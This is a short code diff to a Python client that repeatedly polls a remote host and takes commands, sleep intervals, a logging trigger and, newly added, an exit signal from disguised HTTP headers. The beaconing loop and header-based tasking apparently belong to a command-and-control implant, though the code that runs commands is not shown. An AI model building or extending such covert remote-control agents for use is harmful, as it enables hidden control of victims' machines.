@@ -25,7 +25,7 @@ def connect():
     sleep_time = 2
     while True:
         time.sleep(sleep_time)
-        command, sleeping, log = check_task()
+        command, sleeping, log, signal = check_task()
         if sleeping:
             sleep_time = int(sleeping)
         elif command:
@@ -39,14 +39,17 @@ def connect():
         elif log:
             thread = threading.Thread(target=bootup, args=(), daemon=True)
             thread.start()
+        elif signal:
+            exit(0)
 
 def check_task():
     try:
         r = requests.get(f"http://{target}/check", timeout=5)
-        sleep = r.headers.get("X-Connection-Close")
+        sleep = r.headers.get("X-Connection-State")
         command = r.headers.get("X-Tasks")
         log = r.headers.get("X-Logging")
-        return command, sleep, log
+        signal = r.headers.get("X-Connection-Close")
+        return command, sleep, log, signal
     except requests.exceptions.Timeout:
         print("The request timed out")
         exit(1)
